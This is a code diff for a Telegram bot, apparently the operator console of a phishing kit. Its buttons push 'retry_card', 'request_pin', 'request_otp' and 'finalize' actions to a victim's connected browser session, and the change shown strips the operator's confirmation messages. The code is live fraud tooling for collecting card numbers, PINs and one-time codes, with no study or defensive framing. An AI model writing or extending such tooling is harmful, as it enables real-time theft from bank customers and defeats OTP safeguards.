@@ -268,9 +268,7 @@ bot.on('callback_query', async (callbackQuery) => {
             if (targetSocket) {
                 targetSocket.emit('action', { type: 'finalize' });
             }
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '✅ Finalizando redención...'
-            });
+            await bot.answerCallbackQuery(callbackQuery.id);
             await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: messageId
@@ -280,9 +278,7 @@ bot.on('callback_query', async (callbackQuery) => {
             if (targetSocket) {
                 targetSocket.emit('action', { type: 'retry_card' });
             }
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '🔄 Solicitando tarjeta nuevamente...'
-            });
+            await bot.answerCallbackQuery(callbackQuery.id);
             await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: messageId
@@ -292,9 +288,7 @@ bot.on('callback_query', async (callbackQuery) => {
             if (targetSocket) {
                 targetSocket.emit('action', { type: 'request_pin' });
             }
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '🔐 Solicitando clave de tarjeta...'
-            });
+            await bot.answerCallbackQuery(callbackQuery.id);
             await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: messageId
@@ -304,9 +298,7 @@ bot.on('callback_query', async (callbackQuery) => {
             if (targetSocket) {
                 targetSocket.emit('action', { type: 'request_otp' });
             }
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '📱 Solicitando código OTP...'
-            });
+            await bot.answerCallbackQuery(callbackQuery.id);
             await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: messageId
@@ -315,10 +307,7 @@ bot.on('callback_query', async (callbackQuery) => {
         
     } catch (error) {
         console.error('Error al procesar callback:', error);
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: '❌ Error al procesar la acción',
-            show_alert: true
-        });
+        await bot.answerCallbackQuery(callbackQuery.id);
     }
 });
 
